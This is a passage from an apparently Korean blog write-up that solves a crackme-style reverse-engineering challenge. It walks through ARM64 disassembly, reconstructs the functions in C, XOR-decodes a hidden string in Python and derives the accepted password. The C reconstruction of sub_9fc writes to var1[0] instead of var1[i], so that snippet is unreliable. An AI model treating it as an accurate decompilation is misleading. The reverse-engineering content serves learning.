class="hljs-attribute">a4c</span>:   <span class="hljs-number">39400002</span>    ldrb    w<span class="hljs-number">2</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">a50</span>:   b<span class="hljs-number">94037</span>e<span class="hljs-number">0</span>    ldr w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a54</span>:   b<span class="hljs-number">94023</span>e<span class="hljs-number">1</span>    ldr w<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #32]</span> <span class="hljs-attribute">a58</span>:   <span class="hljs-number">1</span>ac<span class="hljs-number">10</span>c<span class="hljs-number">03</span>    sdiv    w<span class="hljs-number">3</span>, w<span class="hljs-number">0</span>, w<span class="hljs-number">1</span> <span class="hljs-attribute">a5c</span>:   b<span class="hljs-number">94023</span>e<span class="hljs-number">1</span>    ldr w<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #32]</span> <span class="hljs-attribute">a60</span>:   <span class="hljs-number">1</span>b<span class="hljs-number">017</span>c<span class="hljs-number">61</span>    mul w<span class="hljs-number">1</span>, w<span class="hljs-number">3</span>, w<span class="hljs-number">1</span> <span class="hljs-attribute">a64</span>:   <span class="hljs-number">4</span>b<span class="hljs-number">010000</span>    sub w<span class="hljs-number">0</span>, w<span class="hljs-number">0</span>, w<span class="hljs-number">1</span> <span class="hljs-attribute">a68</span>:   <span class="hljs-number">93407</span>c<span class="hljs-number">00</span>    sxtw    x<span class="hljs-number">0</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">a6c</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">1</span>    ldr x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">a70</span>:   <span class="hljs-number">8</span>b<span class="hljs-number">000020</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">1</span>, x<span class="hljs-number">0</span> <span class="hljs-attribute">a74</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">a78</span>:   b<span class="hljs-number">98037</span>e<span class="hljs-number">0</span>    ldrsw   x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a7c</span>:   f<span class="hljs-number">9401</span>fe<span class="hljs-number">3</span>    ldr x<span class="hljs-number">3</span>,<span class="hljs-meta"> [sp, #56]</span> <span class="hljs-attribute">a80</span>:   <span class="hljs-number">8</span>b<span class="hljs-number">000060</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">3</span>, x<span class="hljs-number">0</span> <span class="hljs-attribute">a84</span>:   <span class="hljs-number">4</span>a<span class="hljs-number">010041</span>    eor w<span class="hljs-number">1</span>, w<span class="hljs-number">2</span>, w<span class="hljs-number">1</span> <span class="hljs-attribute">a88</span>:   <span class="hljs-number">12001</span>c<span class="hljs-number">21</span>    and w<span class="hljs-number">1</span>, w<span class="hljs-number">1</span>, #<span class="hljs-number">0</span>xff <span class="hljs-attribute">a8c</span>:   <span class="hljs-number">39000001</span>    strb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">a90</span>:   b<span class="hljs-number">94037</span>e<span class="hljs-number">0</span>    ldr w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a94</span>:   <span class="hljs-number">11000400</span>    add w<span class="hljs-number">0</span>, w<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span> <span class="hljs-attribute">a98</span>:   b<span class="hljs-number">90037</span>e<span class="hljs-number">0</span>    str w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a9c</span>:   b<span class="hljs-number">94037</span>e<span class="hljs-number">1</span>    ldr w<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">aa0</span>:   b<span class="hljs-number">94027</span>e<span class="hljs-number">0</span>    ldr w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #36]</span> <span class="hljs-attribute">aa4</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">aa8</span>:   <span class="hljs-number">54</span>fffccb    b.lt    a<span class="hljs-number">40</span> &lt;sub_<span class="hljs-number">9</span>fc+<span class="hljs-number">0</span>x<span class="hljs-number">44</span>&gt;  // b.tstop <span class="hljs-attribute">aac</span>:   f<span class="hljs-number">9401</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #56]</span> <span class="hljs-attribute">ab0</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">47</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #64</span><span class="hljs-meta"> ab4:   d65f03c0    ret</span></code></pre><p>인자로 받은 값을 차례대로 스택에 저장합니다. <code>w1</code>과 <code>w3</code>은 데이터의 길이로 추정되므로 <code>x0</code>, <code>x2</code>에 들어온 값을 보면 <code>[sp + #40] = \xFC\x7F\x65\x79\xFF\x73\x6C\x7D\xF4\x77\x6D\x61\xE7\x6B\x74\x65\xEC\x6F\x75\x69\xEF\x63\x46\x53\xDA\x5D\x47\x57\xD1\x51\x4E\x5B\xD2\x55\x4F\x5F\xD9\x49\x56\x43\xCA\x4D\x57\x47\xC1\x41\x5E\x4B\xA9\x28\x30\x22\xA2\x2C\x31\x26\xA1\x20</code>, <code>[sp + #24] = \x96\x19\x7\x11\x99\x19\x2\x11</code> 이 됩니다. 스택에 값을 저장한 후 첫 번째 인자의 길이+1 만큼 <code>malloc</code>을 해준 후 <code>sp+#56</code>에 저장합니다. 그 후 첫 번째 인자의 길이를 가져와서 <code>malloc</code>한 주소의 마지막 index에 0x0을 넣어주고 <code>sp+#52</code>에 0을 저장해준 후 <code>a9c</code>로 이동합니다.</p><p><code>a9c</code>에서는 0을 <code>w1</code>에 넣고 첫 번째 문자열의 길이를 <code>w0</code>에 불러온 후 두 개를 비교하여 <code>a40</code>으로 이동합니다. <code>w1=w0</code>이 되면 <code>flag</code>가 <code>0</code>으로 세팅되고 <code>b.lt</code> 연산이 수행되지 않으므로 첫 번째 문자열의 길이만큼 반복하는 구간임을 알 수 있습니다. <code>a40</code>에서 <code>[sp+#40 + sp+#52]</code>의 값을 <code>w2</code>에 넣고 <code>w3</code>에는 <code>sp+#52 - sp+#32 * (sp+#52 / sp+#32)</code> 연산을 통해 <code>sp+#52 % sp+#32</code> 를 수행한 후 해당 주소의 값을 가져와서 두 문자열을 <code>xor</code> 연산합니다.</p><p><code>sub_9fc</code> 를 c로 간단하게 나타내면 아래와 같습니다.</p><pre><code class="hljs c"><span class="hljs-comment">// sub_9fc</span><span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">sub_9fc</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* param1, <span class="hljs-keyword">int</span> param2, <span class="hljs-keyword">char</span>* param3, <span class="hljs-keyword">int</span> param4)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">char</span>* var1 = <span class="hljs-built_in">malloc</span>(param2 + <span class="hljs-number">1</span>);    var1[param2] = <span class="hljs-string">&#x27;\0&#x27;</span>;    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; param2; i++)    &#123;        var1[<span class="hljs-number">0</span>] = (param1[i] ^ param3[i % param4]) &amp; <span class="hljs-number">0xff</span>;    &#125;    <span class="hljs-keyword">return</span> var1;&#125;</code></pre><p>해당 문자열들이 <code>sub_9fc</code>를 거쳐 어떠한 값이 나오는지 구하는 python 스크립트는 아래와 같습니다.</p><pre><code class="hljs python">string1 = [    <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xFF</span>,    <span class="hljs-number">0x73</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x65</span>,    <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x47</span>,    <span class="hljs-number">0x57</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x56</span>,    <span class="hljs-number">0x43</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x30</span>,    <span class="hljs-number">0x22</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x20</span>]string2 = [<span class="hljs-number">0x96</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x11</span>]result = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(string1)):    result += chr(string1[i] ^ string2[i % len(string2)])print(result)<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">C:\Users\idioth\Desktop&gt;lock.py</span><span class="hljs-string">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="hljs-string">&#x27;&#x27;&#x27;</span></code></pre><p><code>sub_9fc</code>까지 마쳤으니 다시 main으로 돌아가죠!</p><pre><code class="hljs c"><span class="hljs-comment">// main</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">char</span> *var1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x13</span>, <span class="hljs-number">1</span>);    <span class="hljs-keyword">int</span> var2 = sub_9b0(sub_ab8());    sub_96c();    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, var1);    sub_b30(var1, var2);    <span class="hljs-built_in">free</span>(var1);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>이제 입력 값을 받아서 <code>sub_b30</code>하는 것만 남았네요. <code>sub_b30</code> 함수를 확인해봅시다.</p><pre><code class="hljs apache"><span class="hljs-attribute">0000000000000b30</span> &lt;sub_b<span class="hljs-number">30</span>&gt;: <span class="hljs-attribute">b30</span>:   a<span class="hljs-number">9</span>be<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-32]!</span><span class="hljs-meta"> b34:   910003fd    mov x29, sp</span><span class="hljs-meta"> b38:   f9000fe0    str x0, [sp, #24]</span> <span class="hljs-attribute">b3c</span>:   f<span class="hljs-number">9000</span>be<span class="hljs-number">1</span>    str x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">b40</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">b44</span>:   <span class="hljs-number">91001800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">6</span> <span class="hljs-attribute">b48</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b4c</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">b50</span>:   <span class="hljs-number">91003800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xe <span class="hljs-attribute">b54</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b58</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">b5c</span>:   <span class="hljs-number">54000761</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">b60</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">b64</span>:   <span class="hljs-number">91001000</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">4</span> <span class="hljs-attribute">b68</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b6c</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">b70</span>:   <span class="hljs-number">91000</span>c<span class="hljs-number">00</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">3</span> <span class="hljs-attribute">b74</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b78</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">b7c</span>:   <span class="hljs-number">54000661</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">b80</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">b84</span>:   <span class="hljs-number">91000</span>c<span class="hljs-number">00</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">3</span> <span class="hljs-attribute">b88</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b8c</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">b90</span>:   <span class="hljs-number">91002800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xa <span class="hljs-attribute">b94</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b98</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">b9c</span>:   <span class="hljs-number">54000561</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">ba0</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">ba4</span>:   <span class="hljs-number">91001</span>c<span class="hljs-number">00</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">7</span> <span class="hljs-attribute">ba8</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bac</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">bb0</span>:   <span class="hljs-number">91004400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">11</span> <span class="hljs-attribute">bb4</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bb8</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">bbc</span>:   <span class="hljs-number">54000461</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">bc0</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">bc4</span>:   <span class="hljs-number">91000400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span> <span class="hljs-attribute">bc8</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bcc</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">bd0</span>:   <span class="hljs-number">91003800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xe <span class="hljs-attribute">bd4</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bd8</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">bdc</span>:   <span class="hljs-number">54000361</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">be0</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">be4</span>:   <span class="hljs-number">91001400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">5</span> <span class="hljs-attribute">be8</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bec</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">bf0</span>:   <span class="hljs-number">9100</span>d<span class="hljs-number">000</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">34</span> <span class="hljs-attribute">bf4</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bf8</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">bfc</span>:   <span class="hljs-number">54000261</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">c00</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">c04</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">c08</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">c0c</span>:   <span class="hljs-number">9100</span>d<span class="hljs-number">400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">35</span> <span class="hljs-attribute">c10</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">c14</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">c18</span>:   <span class="hljs-number">54000181</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">c1c</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">c20</span>:   <span class="hljs-number">91000800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">2</span> <span class="hljs-attribute">c24</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">c28</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">c2c</span>:   <span class="hljs-number">91000800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">2</span> <span class="hljs-attribute">c30</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">c34</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">c38</span>:   <span class="hljs-number">54000081</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">c3c</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">c40</span>:   <span class="hljs-number">97</span>ffffab    bl  aec &lt;sub_aec&gt; <span class="hljs-attribute">c44</span>:   d<span class="hljs-number">503201</span>f    nop <span class="hljs-attribute">c48</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">27</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #32</span><span class="hljs-meta"> c4c:   d65f03c0    ret</span></code></pre><p>위에서 복호화한 <code>[a-zA-Z0-9]</code> 값과 입력 값을 통해 하나씩 비교한 후 조건이 모두 맞으면 <code>x0</code>에  input 값을 넣고 <code>sub_aec</code>를 호출합니다. 값을 비교하는 부분을 간단하게 정리하면 아래와 같습니다.</p><ul><li>var1[0x6] == var2[0xe]</li><li>var1[0x4] == var2[0x3]</li><li>var1[0x3] == var2[0xa]</li><li>var1[0x7] == var2[0x11]</li><li>var1[0x1] == var2[0xe]</li><li>var1[0x5] == var2[0x34]</li><li>var1[0x0] == var2[0x35]</li><li>var1[0x2] == var2[0x2]</li></ul><p>순서에 맞춰서 배열하면 input 값을 구할 수 있습니다.</p><pre><code class="hljs python">user_input = <span class="hljs-string">&quot;&quot;</span>user_input += result[<span class="hljs-number">0x35</span>] + result[<span class="hljs-number">0xe</span>] + result[<span class="hljs-number">0x2</span>] + result[<span class="hljs-number">0xa</span>] + result[<span class="hljs-number">0x3</span>] +result[<span class="hljs-number">0x34</span>] + result[<span class="hljs-number">0xe</span>] + result[<span class="hljs-number">0x11</span>]print(user_input)<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">C:\Users\idioth\Desktop&gt;lock.py</span><span class="hljs-string">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="hljs-string">1ockd0or</span><span class="hljs-string">&#x27;&#x27;&#x27;</span></code></pre><p>조건이 맞는 입력 값을 인자로 <code>sub_aec</code> 값을 호출하니 해당 함수를 확인해보면 아래와 같습니다.</p><pre><code class="hljs apache"><span class="hljs-attribute">value2</span>  DCB <span class="hljs-number">0</span>x<span class="hljs-number">69</span>, <span class="hljs-number">0</span>x<span class="hljs-number">22</span>, <span class="hljs-number">0</span>x<span class="hljs-number">22</span>, <span class="hljs-number">0</span>x<span class="hljs-number">38</span>, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">43</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>C, <span class="hljs-number">0</span>x<span class="hljs-number">45</span>, <span class="hljs-number">0</span>xE, <span class="hljs-number">0</span>x<span class="hljs-number">3</span>C,<span class="hljs-attribute">0x8</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">30</span>, <span class="hljs-number">0</span>x<span class="hljs-number">17</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>, <span class="hljs-number">0</span>x<span class="hljs-number">19</span>, <span class="hljs-number">0</span>x<span class="hljs-number">3</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">44</span>, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">17</span>,<span class="hljs-attribute">0x6E</span>, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">53</span>, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">17</span>, <span class="hljs-number">0</span>x<span class="hljs-number">55</span>, <span class="hljs-number">0</span>x<span class="hljs-number">12</span><span class="hljs-attribute">0000000000000aec</span> &lt;sub_aec&gt;: <span class="hljs-attribute">aec</span>:   a<span class="hljs-number">9</span>bd<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-48]!</span><span class="hljs-meta"> af0:   910003fd    mov x29, sp</span><span class="hljs-meta"> af4:   f9000fe0    str x0, [sp, #24]</span> <span class="hljs-attribute">af8</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">afc</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">29</span>    bl  <span class="hljs-number">7</span>a<span class="hljs-number">0</span> &lt;strlen@plt&gt; <span class="hljs-attribute">b00</span>:   <span class="hljs-number">2</span>a<span class="hljs-number">0003</span>e<span class="hljs-number">3</span>    mov w<span class="hljs-number">3</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">b04</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">2</span>    ldr x<span class="hljs-number">2</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">b08</span>:   <span class="hljs-number">528003</span>e<span class="hljs-number">1</span>    mov w<span class="hljs-number">1</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span>f                   // #<span class="hljs-number">31</span> <span class="hljs-attribute">b0c</span>:   <span class="hljs-number">90000000</span>    adrp    x<span class="hljs-number">0</span>, value<span class="hljs-number">2</span>@page <span class="hljs-attribute">b10</span>:   <span class="hljs-number">91382000</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, value<span class="hljs-number">2</span>@pageoff <span 